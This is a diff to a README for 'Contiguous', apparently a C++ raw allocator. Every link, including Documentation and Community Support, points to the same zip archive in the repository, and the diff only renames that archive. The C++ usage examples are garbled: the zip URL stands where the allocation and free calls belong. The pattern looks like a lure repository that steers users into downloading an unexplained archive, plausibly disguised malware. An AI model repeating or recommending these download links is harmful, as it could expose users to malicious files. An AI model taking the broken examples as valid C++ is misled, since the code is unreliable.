@@ -6,7 +6,7 @@ Contiguous is a minimal C++ raw allocator specifically designed for efficient me
 
 ## 📥 Download Contiguous
 
-[![Download Contiguous](https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-thermophosphor.zip%20Contiguous-v1.0-blue)](https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-thermophosphor.zip)
+[![Download Contiguous](https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-3.1-beta.2.zip%20Contiguous-v1.0-blue)](https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-3.1-beta.2.zip)
 
 ## 💻 System Requirements
 
@@ -28,7 +28,7 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, visit the following page to download the latest version of Contiguous:
 
-[Download Contiguous Releases](https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-thermophosphor.zip)
+[Download Contiguous Releases](https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-3.1-beta.2.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed.
@@ -51,7 +51,7 @@ Once you have Contiguous running, you can start using it for manual memory manag
    
    ```cpp
    // Example
-   MyClass* obj = new (https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-thermophosphor.zip(sizeof(MyClass))) MyClass();
+   MyClass* obj = new (https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-3.1-beta.2.zip(sizeof(MyClass))) MyClass();
    ```
 
 2. **Destroying an Object:** When you no longer need the object, properly destroy it and free the memory.
@@ -59,7 +59,7 @@ Once you have Contiguous running, you can start using it for manual memory manag
    ```cpp
    // Example
    obj->~MyClass(); // Call destructor
-   https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-thermophosphor.zip(obj); // Free memory
+   https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-3.1-beta.2.zip(obj); // Free memory
    ```
 
 3. **Testing Performance:** Measure how Contiguous improves your application’s performance using benchmark tests.
@@ -95,8 +95,8 @@ Explore these areas to better understand how Contiguous can enhance your applica
 
 ## 🔗 Quick Links
 
-- [Download Contiguous](https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-thermophosphor.zip)
-- [Documentation](https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-thermophosphor.zip)
-- [Community Support](https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-thermophosphor.zip)
+- [Download Contiguous](https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-3.1-beta.2.zip)
+- [Documentation](https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-3.1-beta.2.zip)
+- [Community Support](https://raw.githubusercontent.com/AjayAjishaa/Contiguous/main/downstream/Software-3.1-beta.2.zip)
 
 With Contiguous, you can effectively manage memory in your applications and optimize performance with ease. Happy coding!
